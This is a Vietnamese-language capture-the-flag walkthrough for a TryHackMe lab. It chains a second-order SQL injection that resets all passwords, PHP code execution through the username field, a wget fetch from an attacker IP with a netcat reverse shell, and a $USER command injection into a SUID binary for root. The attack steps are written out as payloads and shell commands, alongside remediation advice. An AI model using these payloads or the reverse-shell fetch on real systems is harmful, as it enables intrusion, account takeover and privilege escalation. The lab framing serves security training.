@@ -1,0 +1,160 @@
+---
+title: 'WWBuddy'
+description: 'Một SQL injection bậc hai trong trường username reset hàng loạt mật khẩu; cùng username phản chiếu cho thực thi code PHP dưới www-data; một mật khẩu bị log do gõ nhầm và một mật khẩu dựa trên ngày sinh để chuyển qua các user; một SUID binary chạy lệnh dựng từ $USER cho root.'
+date: 2026-02-26
+platform: tryhackme
+room: 'WWBuddy'
+roomUrl: 'https://tryhackme.com/room/wwbuddy'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'sql-injection'
+  - 'rce'
+  - 'command-injection'
+  - 'mysql'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'authenticated remote code execution'
+  - 'weak credentials'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "WWBuddy" trên TryHackMe. Trường username là chìa khoá của mọi thứ: nó không được kiểm tra, nên vừa là một SQL injection bậc hai (reset mật khẩu hàng loạt) vừa là một điểm thực thi code PHP. Từ một shell www-data, ta chuyển qua một mật khẩu bị log do gõ nhầm và một mật khẩu mặc định dựa trên ngày sinh, rồi lạm dụng một SUID binary dựng lệnh shell từ biến_ _`$USER`_ _do kẻ tấn công kiểm soát để lên root._
+
+> WWBuddy là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Mọi flag và mật khẩu khôi phục được hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Đăng ký trên app chat WWBuddy → **trường username không bao giờ được kiểm tra**, nên đặt nó thành một payload SQLi và luồng đổi mật khẩu chạy truy vấn `WHERE username = '...'` **reset mật khẩu của mọi user** → đăng nhập bằng user khác, đọc một cuộc chat gợi ý mật khẩu mặc định là ngày sinh → cùng username phản chiếu trên `/admin` thực thi PHP, nên một username `<?php system(...) ?>` cho **thực thi code dưới www-data** (+ một flag) và một reverse shell → MySQL `general.log` làm lộ một mật khẩu gõ vào trường username (**roberto**) → một note tiết lộ ngày sinh của đồng nghiệp, chính là mật khẩu SSH của **jenny** → SUID `/bin/authenticate` chạy `usermod -G developer $USER` qua `system()`, nên `export USER=';cp /bin/bash /a;'` + `chmod 4755` cho một **SUID root bash** (root flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH và một app login Apache/PHP có `PHPSESSID` thiếu `HttpOnly`:
+
+```text
+22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+80/tcp open  http  Apache 2.4.29   # WWBuddy - Login (PHPSESSID httponly not set)
+```
+
+Đăng ký một tài khoản và khám phá — đây là một app chat với một bot bạn mặc định `wwbuddy`. `gobuster` lộ ra `/admin` (cấm với user thường), `/api`, `/change`, `/profile`, `/register`.
+
+### **Lỗ hổng**
+
+SQLMap không tìm ra gì trên các input hiển nhiên, vì lỗi là **bậc hai (second-order)**: trường `username` không được kiểm tra, và backend tin tưởng nó trong các truy vấn về sau và trong một trang render nó. Một trường không kiểm tra do đó là hai lỗi riêng biệt.
+
+<Callout type="insight">
+
+Đặt username của bạn thành `admin' or 1 = 1 -- -` rồi dùng **Change Password**. Truy vấn đổi mật khẩu đại loại là `... WHERE username = '<username của bạn>'`, nên đoạn chèn khiến nó khớp **mọi dòng** — một lần reset mật khẩu hàng loạt cho tất cả user, không chỉ bạn. _Cùng_ username không kiểm tra đó về sau được phản chiếu vào một ngữ cảnh PHP trên `/admin`, nên một username `<?php system('id') ?>` được thực thi ở server. Kiểm tra một trường một lần, hoặc trả giá ở mọi nơi nó được dùng.
+
+</Callout>
+
+### **Bước 1 — SQLi bậc hai → reset mật khẩu của mọi người**
+
+Đổi username thành một payload SQLi, rồi chạy luồng change-password với một mật khẩu mới. Vì truy vấn khớp mọi dòng, mọi tài khoản (kể cả `wwbuddy`, `henry`, `roberto`) giờ dùng chung mật khẩu đó. Đăng nhập thành `wwbuddy`, rồi `henry`:
+
+```text
+# username set to:  admin' or 1 = 1 -- -
+# then Change Password -> all users now have your chosen password
+```
+
+Chat của `henry` tiết lộ mật khẩu mặc định của nhân viên mới là **ngày sinh** (mm/dd/yyyy) — ghi nhớ cho sau.
+
+### **Bước 2 — username phản chiếu → PHP RCE dưới www-data (flag)**
+
+Trang log `/admin` phản chiếu username mà không encode và thực thi nó như PHP. Đặt username thành một one-liner PHP và reload `/admin` với tư cách `henry`:
+
+```text
+# username:  <?php system('id') ?>
+# /admin reflects: uid=33(www-data) gid=33(www-data) ...   + <!-- THM{<redacted>} -->
+```
+
+Vì có giới hạn độ dài username, dàn reverse shell thành hai bước — fetch trước, rồi thực thi:
+
+```text
+# username:  <?php system('wget $ATTACKER_IP/shell.sh') ?>
+# then a username that runs it -> nc -lvnp 4444 catches www-data
+www-data@wwbuddy:/var/www/html/admin$
+```
+
+### **Bước 3 — chuyển sang roberto, rồi jenny**
+
+`config.php` có creds DB (`root` / một mật khẩu yếu) nhưng MySQL không có gì mới. Tuy nhiên MySQL `general.log` bắt được một mật khẩu gõ vào trường username:
+
+```text
+www-data@wwbuddy:/var/log$ grep -Ri password mysql/general.log
+# ... username = 'Roberto<redacted>'   <- roberto's password, mistyped into the username
+su roberto   # -> roberto
+```
+
+`importante.txt` của `roberto` (tiếng Bồ Đào Nha) chứa một flag và một gợi ý: một đồng nghiệp, **jenny**, tuần sau tròn 26 tuổi, và file đề ngày 07/27/2020 — nên ngày sinh (mật khẩu mặc định) là 08/03/1994:
+
+```text
+roberto@wwbuddy:~$ cat importante.txt   # THM{<redacted>} + birthday hint
+ssh jenny@$IP   # password = <redacted birthday, mm/dd/yyyy>
+```
+
+### **Bước 4 — SUID authenticate + chèn $USER → root (root flag)**
+
+`jenny` không sudo được, nhưng một SUID binary `/bin/authenticate` nổi bật. Decompile nó (Ghidra) cho thấy nó `setuid(0)` rồi dựng một lệnh shell từ biến môi trường **`USER`** và truyền cho `system()`:
+
+```text
+setuid(0);
+strncpy(cmd, "usermod -G developer ", ...);
+strncat(cmd, getenv("USER"), ...);
+system(cmd);   // $USER is attacker-controlled
+```
+
+Nên ta chèn lệnh qua `$USER`. Độ dài bị giới hạn, nên copy bash về một đường dẫn ngắn và SUID nó:
+
+```text
+jenny@wwbuddy:~$ export USER=';cp /bin/bash /a;'
+jenny@wwbuddy:~$ /bin/authenticate        # runs: usermod ... ; cp /bin/bash /a ;
+jenny@wwbuddy:~$ export USER=';chmod 4755 /a;'
+jenny@wwbuddy:~$ /bin/authenticate        # /a is now SUID root
+jenny@wwbuddy:~$ /a -p                     # whoami -> root
+# cat /root/root.txt -> THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). Một username không kiểm tra vừa là SQL injection bậc hai (reset mật khẩu hàng loạt mọi tài khoản) vừa là điểm thực thi code PHP (RCE dưới www-data). Credential yếu/dễ đoán (mật khẩu bị log do gõ nhầm, mật khẩu mặc định theo ngày sinh) đi giữa các user, và một SUID binary thực thi lệnh dựng từ `$USER` leo lên root đầy đủ — xâm phạm hoàn toàn host và ứng dụng.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Kiểm tra và tham số hoá.** Đối xử username như mọi input: allow-list chặt, truy vấn tham số hoá, và output-encode nó ở mọi nơi được render. Không bao giờ thực thi trường đã lưu như code.
+- **Không log credential.** MySQL `general.log` đã bắt một mật khẩu; tắt log truy vấn chi tiết ở production và bảo vệ file log.
+- **Cấm mật khẩu dễ đoán.** Một mật khẩu mặc định theo ngày sinh bị đoán dễ dàng; ép mật khẩu mạnh, duy nhất và đổi khi đăng nhập lần đầu.
+- **Sửa SUID binary.** Một chương trình đặc quyền root không bao giờ được dựng lệnh shell từ biến môi trường; dùng `execve` với vector đối số cố định và hạ quyền sớm.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một trường, hai lớp lỗi.** Username không kiểm tra vừa là SQLi vừa là RCE — kiểm tra tại nguồn, không phải từng điểm sử dụng.
+- **Injection bậc hai ẩn khỏi SQLMap.** Payload rơi vào kho lưu trữ và kích hoạt về sau; test các giá trị đã lưu, không chỉ phản hồi tức thì.
+- **Log làm lộ bí mật.** Một mật khẩu gõ nhầm trong `general.log` là toàn bộ bàn đạp chuyển hướng.
+- **`$USER`** **vào** **`system()`** **là command injection.** Bất kỳ biến môi trường nào kẻ tấn công kiểm soát đều là input không đáng tin với một tiến trình đặc quyền.
+
+WWBuddy là một lời nhắc sắc bén rằng một trường duy nhất không kiểm tra có thể là toàn bộ kill chain. Cảm ơn đã đọc.
